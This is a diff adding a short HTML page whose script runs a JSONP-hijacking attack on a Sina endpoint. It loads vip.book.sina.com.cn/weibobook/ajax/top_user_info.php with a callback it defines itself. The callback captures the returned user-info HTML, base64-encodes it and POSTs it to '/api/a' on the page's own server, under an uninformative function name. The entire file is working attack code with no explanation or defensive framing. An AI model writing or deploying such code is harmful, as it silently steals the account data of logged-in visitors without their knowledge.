@@ -1,0 +1,24 @@
+<script>
+    function createElementFromHTML(htmlString) {
+        var div = document.createElement('div');
+        div.innerHTML = htmlString.trim();
+        return div.firstChild;
+    }
+
+    function a(content) {
+        $.ajax({
+            url: "/api/a",
+            data: {data: btoa(window.encodeURIComponent(content))},
+            type: "POST",
+            dataType: "json",
+            success: function(data) {
+            }
+        });
+    }
+    const STK_15749565281201= function(obj){
+        let dom = createElementFromHTML(obj.data.html);
+        a(obj.data.html)
+    }
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.5.0/jquery.min.js"></script>
+<script src="http://vip.book.sina.com.cn/weibobook/ajax/top_user_info.php?callback=STK_15749565281201"></script>
